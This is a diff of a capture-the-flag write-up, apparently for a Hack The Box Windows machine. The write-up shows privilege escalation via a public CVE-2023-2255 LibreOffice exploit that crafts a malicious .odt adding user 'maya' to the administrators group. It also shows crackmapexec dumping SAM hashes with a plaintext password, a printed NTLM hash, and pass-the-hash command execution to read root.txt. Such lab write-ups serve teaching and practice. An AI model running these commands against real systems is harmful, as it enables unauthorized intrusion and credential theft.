@@ -62,7 +62,7 @@ after using winpeas we can see some interesting things :&#x20;
 
 {% embed url="https://github.com/elweth-sec/CVE-2023-2255" %}
 
-in order to exploit this CVE we have first to generate a malicious odt file  with our injected&#x20;
+in order to exploit this CVE we have first to generate a malicious .odt file  with our comand to gain privilege. Then we have to assure this .odt will be open. &#x20;
 
 ```
 python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'file.odt'
@@ -70,9 +70,11 @@ python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --outp
 
 <figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
+We copy it in Important Documents And then we are affected to the Admin group.
 
-
+```bash
 crackmapexec smb 10.129.231.40 -u maya -p "m4y4ngs4ri" --sam
+```
 
 
 
@@ -80,4 +82,7 @@ crackmapexec smb 10.129.231.40 -u maya -p "m4y4ngs4ri" --sam
 
 localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
 
+```bash
 crackmapexec smb 10.129.231.40 -u localadmin -H "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae" -x "cmd.exe /c type c:\users\localadmin\Desktop\root.txt"
+```
+
